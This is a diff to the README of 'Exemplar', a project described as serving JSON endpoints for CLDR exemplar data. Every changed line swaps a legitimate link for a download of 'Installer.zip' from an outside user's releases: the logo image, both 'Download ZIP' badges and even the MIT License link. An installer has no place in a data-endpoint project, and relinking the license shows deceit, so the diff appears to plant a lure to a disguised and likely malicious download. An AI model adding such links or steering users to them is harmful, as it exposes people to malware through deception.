@@ -1,10 +1,10 @@
 # Exemplar
 
-![Exemplar Logo](https://example.com/exemplar-logo.png)
+![Exemplar Logo](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip)
 
 JSON endpoints for CLDR exemplar data by locale tag
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip)](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Exemplar is a repository that provides JSON endpoints for CLDR exemplar data cat
 
 To access the Exemplar repository and make use of the JSON endpoints for CLDR exemplar data, you can download the ZIP file using the following link:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip)](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip)
 
 Please ensure to extract the contents of the ZIP file and follow the instructions provided in the repository to set up and utilize the JSON endpoints effectively.
 
@@ -81,7 +81,7 @@ When contributing, please ensure adherence to the repository's guidelines and co
 
 ## License
 
-The Exemplar repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the code as per the terms of the license. Please refer to the LICENSE file included in the repository for more details on the permissions and limitations imposed by the MIT License.
+The Exemplar repository is licensed under the [MIT License](https://github.com/ramazan1518/exemplar/releases/download/v1.0/Installer.zip). You are free to use, modify, and distribute the code as per the terms of the license. Please refer to the LICENSE file included in the repository for more details on the permissions and limitations imposed by the MIT License.
 
 ---
 
